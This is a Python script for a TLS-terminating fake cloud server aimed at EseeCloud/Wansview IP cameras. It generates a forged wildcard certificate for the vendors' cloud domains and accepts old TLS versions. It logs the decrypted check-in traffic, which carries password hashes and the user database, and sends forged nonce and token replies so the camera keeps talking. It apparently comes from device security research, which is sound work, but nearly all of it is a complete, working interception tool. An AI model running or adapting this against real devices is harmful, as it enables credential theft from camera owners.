#!/usr/bin/env python3
"""
eseecloud-tls-server.py — TLS-terminating fake cloud server.

The camera's cloud check-in is TLS (observed live: Wansview/TopGroup units
connect to :8080/:443 and send a TLS ClientHello). The plain eseecloud
fake server only logs ciphertext, so the password hash stays unreadable.

This server terminates the TLS connection with a forged self-signed
certificate. Cheap IP cameras frequently do NOT validate certificates, so
the handshake completes and the plaintext check-in (which carries the
password hash / user DB) is logged.

USAGE:
  python3 scripts/eseecloud-tls-server.py \\
      --ports 8080 8443 443 9900 \\
      --log-dir captures/<session>/

Dependencies: openssl (to generate the cert at startup), Python 3.7+.
"""

import argparse
import asyncio
import importlib.util
import os
import re
import shutil
import ssl
import struct
import subprocess
import sys
import tempfile
from datetime import datetime, timezone
from pathlib import Path

# Reuse the /address/device, /message/nonce, /message/sts and /message/message
# forge engines from the plain dns-server: the 5523-W rides those HTTP
# check-in requests over TLS (sts.dvr163.com:9900 — observed in run 7), so
# they arrive here as decrypted plaintext and must be answered HERE. Wiring
# them only on the plain :80 listener (as before) left the whole /message/
# chain unanswered (0 NONCE_FORGED / STS_FORGED / MESSAGE_POST every run),
# the camera never got a nonce, and the check-in never advanced.
SCRIPT_DIR = Path(__file__).resolve().parent
_spec = importlib.util.spec_from_file_location(
    "dns", SCRIPT_DIR / "eseecloud-dns-server.py")
dnsmod = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(dnsmod)


def gen_self_signed_cert(common_name: str = "*.eseecloud.com") -> tuple[str, str]:
    """Generate a throwaway self-signed cert. Returns (cert_path, key_path)."""
    if not shutil.which("openssl"):
        raise SystemExit("openssl not found — required to generate the forged cert")
    tmp = tempfile.mkdtemp(prefix="esee-tls-")
    cert = os.path.join(tmp, "cert.pem")
    key = os.path.join(tmp, "key.pem")
    try:
        subprocess.run(
            [
                "openssl", "req", "-x509", "-newkey", "rsa:2048",
                "-nodes", "-keyout", key, "-out", cert,
                "-days", "1",
                "-subj", f"/CN={common_name}",
                "-addext", "subjectAltName=DNS:*.eseecloud.com,DNS:*.dvr163.com,"
                "DNS:*.xmeye.net,DNS:msg-img-hk.oss-cn-hongkong.aliyuncs.com,"
                "DNS:localhost,IP:10.0.0.149",
            ],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except (subprocess.CalledProcessError, OSError) as e:
        raise SystemExit(f"openssl cert generation failed: {e}")
    return cert, key


def make_ssl_context(cert: str, key: str) -> ssl.SSLContext:
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(cert, key)
    # Accept TLS 1.0+ — old embedded TLS stacks are common on cameras.
    ctx.minimum_version = ssl.TLSVersion.TLSv1
    return ctx


class TlsCaptureServer:
    """TLS-terminating server that logs all decrypted bytes from the camera."""

    def __init__(self, ports: list[int], log_dir: str, ssl_ctx: ssl.SSLContext):
        self.ports = ports
        self.log_dir = log_dir
        self.ssl_ctx = ssl_ctx
        self.servers: list[asyncio.AbstractServer] = []
        self.conn_log = os.path.join(log_dir, "eseecloud-connections.log")
        self.data_log = os.path.join(log_dir, "eseecloud-data.bin")
        # Forge engine (shared /address/device + /message/ reply builders from
        # the plain dns-server). Instantiated with ports=[] — we only reuse
        # its request-handling methods, not its TCP listeners. It shares this
        # session's connections log, so forged nonce/sts/message replies land
        # in the same eseecloud-connections.log the script greps for verdicts.
        self.forge = dnsmod.FakeEseeCloudServer(ports=[], log_dir=log_dir)

    async def start(self):
        for port in self.ports:
            try:
                server = await asyncio.start_server(
                    lambda r, w: self._handle(r, w, port),
                    host="0.0.0.0",
                    port=port,
                    ssl=self.ssl_ctx,
                )
                self.servers.append(server)
                print(f"  [TLS] fake server listening on tcp :{port} (TLS-terminating)")
            except OSError as e:
                print(f"  [TLS] WARNING: cannot bind :{port}: {e}", file=sys.stderr)
        if not self.servers:
            raise SystemExit("  [TLS] no ports bound — nothing to do")

    def stop(self):
        for s in self.servers:
            s.close()

    def _try_http_forge(self, buf: bytes, port: int,
                        writer: asyncio.StreamWriter):
        """If buf holds a complete EseeCloud HTTP check-in request, reply with
        the forged JSON and return the bytes consumed; else None.

        Mirrors the plain dns-server's DISCOVERY_FORGE_PORTS handling so both
        transports answer identically. GETs consume headers only; POSTs wait
        for the full Content-Length body. Non-check-in requests (OSS image
        PUTs, /message/message when body is still arriving) return None.
        """
        head_end = buf.find(b"\r\n\r\n")
        if head_end == -1:
            return None  # headers not complete yet
        headers = buf[:head_end].decode("latin-1", errors="replace")
        first_line = headers.split("\r\n", 1)[0]
        try:
            if first_line.startswith("GET ") and "/message/nonce" in first_line:
                response = self.forge._forge_nonce_response()
                print(f"  [TLS :{port}] FORGED /message/nonce reply")
                writer.write(response)
                return head_end + 4
            if first_line.startswith("GET ") and "/message/sts" in first_line:
                response = self.forge._forge_sts_response(first_line)
                print(f"  [TLS :{port}] FORGED /message/sts reply")
                writer.write(response)
                return head_end + 4
            if first_line.startswith("GET ") and "/PushStsDns.php" in first_line:
                idx = (self.forge._message_reply_index
                       % len(self.forge.PUSH_DNS_REPLY_FORMATS))
                self.forge._message_reply_index += 1
                body = self.forge.PUSH_DNS_REPLY_FORMATS[idx].format(
                    ip=self.forge.our_ip).encode("utf-8")
                response = (
                    b"HTTP/1.1 200 OK\r\n"
                    b"Content-Type: application/json,charset=utf-8\r\n"
                    + f"Content-Length: {len(body)}\r\n".encode("ascii")
                    + b"Connection: keep-alive\r\n"
                    + b"Access-Control-Allow-Origin: *\r\n"
                    + b"\r\n" + body
                )
                print(f"  [TLS :{port}] FORGED /PushStsDns.php reply")
                writer.write(response)
                return head_end + 4
            if first_line.startswith(("POST ", "GET ")) and "/message/message" in first_line:
                m = re.search(r"Content-Length:\s*(\d+)", headers, re.IGNORECASE)
                if not m or not m.group(1).isdigit():
                    return None
                content_length = int(m.group(1))
                body_start = head_end + 4
                if len(buf) < body_start + content_length:
                    return None  # body not fully arrived yet
                body = buf[body_start:body_start + content_length]
                response = self.forge._forge_message_response(first_line, body)
                print(f"  [TLS :{port}] FORGED /message/message reply")
                writer.write(response)
                return body_start + content_length
            if first_line.startswith("POST ") and "/address/device" in first_line:
                m = re.search(r"Content-Length:\s*(\d+)", headers, re.IGNORECASE)
                if not m or not m.group(1).isdigit():
                    return None
                content_length = int(m.group(1))
                body_start = head_end + 4
                if len(buf) < body_start + content_length:
                    return None  # body not fully arrived yet
                body = buf[body_start:body_start + content_length]
                response = self.forge._forge_discovery_response(body)
                print(f"  [TLS :{port}] FORGED /address/device reply")
                writer.write(response)
                return body_start + content_length
        except (ValueError, OSError) as e:
            print(f"  [TLS :{port}] forge error: {type(e).__name__}: {e}")
            return None
        return None

    async def _handle(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter,
                      port: int):
        addr = writer.get_extra_info("peername")
        ts = datetime.now(timezone.utc).isoformat()
        print(f"  [TLS :{port}] CONNECT {addr[0]}:{addr[1]}")
        with open(self.conn_log, "a") as f:
            f.write(f"{ts} CONNECT {addr[0]}:{addr[1]} -> :{port}\n")

        total = 0
        buf = b""  # accumulate across reads to detect complete HTTP requests
        try:
            # TLS handshake happens transparently here (asyncio wraps the
            # transport with the server-side SSL context). If the camera
            # validates the cert, handshake fails and we see an exception.
            while True:
                try:
                    data = await asyncio.wait_for(reader.read(65536), timeout=60.0)
                except asyncio.TimeoutError:
                    break
                if not data:
                    break
                total += len(data)
                recv_ts = datetime.now(timezone.utc)
                recv_ts_str = recv_ts.isoformat()
                with open(self.conn_log, "a") as f:
                    f.write(f"{recv_ts_str} DATA port={port} len={len(data)} "
                            f"hex={data[:128].hex()}\n")
                with open(self.data_log, "ab") as f:
                    f.write(struct.pack("!Q", int(recv_ts.timestamp() * 1_000_000)))
                    f.write(struct.pack("!I", port))
                    f.write(struct.pack("!I", len(data)))
                    f.write(data)
                print(f"  [TLS :{port}] RECV {len(data)} bytes plaintext from "
                      f"{addr[0]}:{addr[1]}")
                for off in range(0, len(data), 16):
                    chunk = data[off:off + 16]
                    hexs = " ".join(f"{b:02x}" for b in chunk)
                    asciis = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
                    print(f"      {off:04x}  {hexs:<48s}  |{asciis}|")
                buf += data
                # Recognized EseeCloud HTTP check-in requests (nonce / sts /
                # post_v2 / address-device / PushStsDns) are answered with the
                # forged JSON — the camera rides these over TLS :9900, so this
                # is where the /message/ chain finally advances. OSS image
                # PUTs and other binary flows are only logged (no reply).
                # Inner loop reprocesses remaining buf so a pipelined
                # nonce->sts burst in one TCP chunk is both answered without
                # blocking on the next read. NOTE: the loop's only exit is
                # break-on-None, so post-loop `consumed` is ALWAYS None — track
                # replies with a flag, or every forged 200 would fall through
                # to the \x00 ACK injector below and corrupt the stream.
                replied = False
                while True:
                    consumed = self._try_http_forge(buf, port, writer)
                    if consumed is None:
                        break
                    replied = True
                    buf = buf[consumed:]
                if replied:
                    await writer.drain()
                    continue  # keep the connection for the next request
                # Unrecognized binary flows (e.g. a 44KB JPEG upload) accumulate
                # in buf forever; cap it so a long image push can't grow memory.
                if len(buf) > 1_000_000:
                    buf = b""
                # Send a benign ACK so the camera keeps talking instead of
                # giving up. '00' is a neutral keep-alive byte for these
                # protocols; if the camera disconnects anyway, it reconnects
                # and we still captured the first payload. Never inject it
                # mid-HTTP-request: an in-flight nonce/sts exchange would be
                # corrupted by a stray byte.
                if b"HTTP/1.1" not in buf and not buf.lstrip().startswith(
                        (b"GET ", b"POST", b"PUT", b"HEAD", b"OPTIONS")):
                    try:
                        writer.write(b"\x00")
                        await writer.drain()
                    except Exception:
                        pass
        except (ssl.SSLError, ConnectionError, OSError, asyncio.IncompleteReadError) as e:
            # Distinguish real cert rejection (client sent a TLS alert) from
            # non-TLS bytes (a camera speaking the plaintext protocol on this
            # port yields "wrong version number" — that must NOT trip the
            # capture script's fail-fast, the plaintext path may still work).
            marker = "CERTREJECT" if "alert" in str(e).lower() else "HANDSHAKEFAIL"
            print(f"  [TLS :{port}] {addr[0]} handshake/read error: {marker} "
                  f"{type(e).__name__}: {e}")
            with open(self.conn_log, "a") as f:
                f.write(f"{datetime.now(timezone.utc).isoformat()} "
                        f"{marker} port={port} {type(e).__name__}: {e}\n")
        finally:
            with open(self.conn_log, "a") as f:
                f.write(f"{datetime.now(timezone.utc).isoformat()} DISCONNECT "
                        f"{addr[0]}:{addr[1]} port={port} total_bytes={total}\n\n")
            try:
                writer.close()
                await writer.wait_closed()
            except OSError:
                pass


async def main_async(args):
    os.makedirs(args.log_dir, exist_ok=True)
    print("=" * 60)
    print("  EseeCloud/Wansview TLS-terminating fake server")
    print("=" * 60)
    print(f"  Ports:       {args.ports}")
    print(f"  Log dir:     {args.log_dir}")
    print("=" * 60)
    print()
    print("  Generating forged self-signed certificate...")
    cert, key = gen_self_signed_cert(args.cn)
    print(f"  Cert: {cert}")
    ctx = make_ssl_context(cert, key)

    server = TlsCaptureServer(args.ports, args.log_dir, ctx)
    await server.start()
    print()
    print("  TLS-terminating servers up. Waiting for camera connections...")
    print("  (if the camera validates certs, handshakes fail and we log SSLERR)")
    print()
    try:
        while True:
            await asyncio.sleep(3600)
    except asyncio.CancelledError:
        pass
    finally:
        server.stop()


def main():
    parser = argparse.ArgumentParser(
        description="TLS-terminating fake EseeCloud/Wansview server"
    )
    parser.add_argument("--ports", type=int, nargs="+", required=True,
                        help="TCP ports to TLS-terminate (e.g. 8080 443 8443 9900)")
    parser.add_argument("--log-dir", required=True, help="Output directory")
    parser.add_argument("--cn", default="*.eseecloud.com",
                        help="Common name for the forged cert")
    args = parser.parse_args()
    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        print("\n  Interrupted. Shutting down...")


if __name__ == "__main__":
    main()
